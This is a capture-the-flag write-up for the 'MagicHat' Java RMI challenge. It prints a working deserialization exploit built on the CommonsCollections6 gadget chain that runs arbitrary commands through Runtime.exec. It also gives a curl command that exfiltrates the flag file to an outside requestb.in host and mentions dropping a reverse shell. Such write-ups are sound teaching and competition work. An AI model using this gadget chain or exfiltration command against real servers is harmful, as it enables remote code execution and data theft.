# MagicHat (Pwn, 321p, 9 solved)

In the task we get a [client](magic_hat_client.jar) for Java RMI application.
We can add this jar as a library in IntelliJ IDEA project, and it will decompile the code for us.

The code is rather simple, we establish a connection via RMI with the server and then we can place some objects inside Hat object, and send it to the server.
Server takes those objects and does some operations on them.

```java
Properties props = System.getProperties();
props.setProperty("javax.net.ssl.trustStore", "magic_hat_truststore");
props.setProperty("javax.net.ssl.trustStorePassword", "magic_hat");
Registry registry = LocateRegistry.getRegistry(InetAddress.getByName("magichat.teaser.insomnihack.ch").getHostName(), 51966, new SslRMIClientSocketFactory());
WizardAPI wizardAPI = (WizardAPI)registry.lookup("Wizard");
//
Hat magicHat = wizardAPI.getMagicHat();
//
magicHat.add(new Wand());
//
Pair<String, Hat> answer = wizardAPI.castASpell(magicHat);
magicHat = (Hat)answer.getRight();
System.out.println((String)answer.getLeft());
```

RMI has 2 types of objects which can be passed between remote endpoints - Remote objects (passed as proxies), and Serializable objects, passed in serialized form.
In our case every artifact we can place in the Hat is Serializable.
The Hat itself is simply:

```java
public class Hat extends Artifact {
    private Bag content = new HashBag();

    public void add(Artifact a) {
        this.content.add(a);
    }

    public String toString() {
        String str = super.toString();
        if (!this.content.isEmpty()) {
            str = str + " that contains: \n" + this.content.toString().replace(":", "x ").replace(',', '\n');
        }
        return str;
    }
}
```

The vulnerability here is that server endpoint deserializes objects we send. 
It might later crash with `ClassCastException` if the objects were not of the expected type, but they will be deserialized before that happens.
It's also worth understanding that Java doesn't have notion of generic types at runtime.
Pretty much any collection type can store any objects, also of totally unrelated types.
It means we can store anything in the `HashBag` in `Hat` class.

We used slightly modified payload from [ysoserial](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java).
We use the same approach, but instead of `HashSet` we create `HashBag`, we also used `Whitebox` to skip all the reflection madness:

```java
private static Hat preparePayload(String command) {
	// like in CommonsCollections6
	String[] execArgs = new String[]{command};
	Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
	Transformer transformerChain = new ChainedTransformer(transformers);
	Map innerMap = new HashMap();
	Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
	TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
	HashBag bagWithExploit = new HashBag();
	bagWithExploit.add(new Object());

	Map internalMap = Whitebox.getInternalState(bagWithExploit, "map");
	Object[] nodesArray = Whitebox.getInternalState(internalMap, "table");
	Object node = Arrays.stream(nodesArray)
			.filter(Objects::nonNull)
			.findFirst()
			.orElseThrow(() -> new RuntimeException("this can't happen"));
	Whitebox.setInternalState(node, "key", entry);

	Hat hat = new Hat();
	Whitebox.setInternalState(hat, "content", bagWithExploit);
	return hat;
}
```

Now we can simply send this `hat` to the server to invoke `command`.
We run the exploit with:

```java
    public static void main(final String[] args) throws Exception {
        Properties props = System.getProperties();
        props.setProperty("javax.net.ssl.trustStore", "magic_hat_truststore");
        props.setProperty("javax.net.ssl.trustStorePassword", "magic_hat");
        Registry registry = LocateRegistry.getRegistry(InetAddress.getByName("magichat.teaser.insomnihack.ch").getHostName(), 51966, new SslRMIClientSocketFactory());
        WizardAPI wizard = (WizardAPI) registry.lookup("Wizard");
        Scanner sc = new Scanner(System.in);
        while (true) {
            System.out.print("> ");
            execCommand(wizard, sc.nextLine());
        }
    }

    private static void execCommand(WizardAPI wizard, String command) {
        try {
            wizard.castASpell(preparePayload(command));
        } catch (Exception e) {
        }
    }
```

And we basically have RCE on the server, although without immediate echo, but we can always drop a reverse-shell.
After some poking around we find the `flag.txt` file in `/home/magic-hat` so we can grab it with:

`curl -d @/home/magic-hat/flag.txt -X POST https://requestb.in/blablabla`

And we get: `INS{lol_ur_a_lizard_Gary!}`
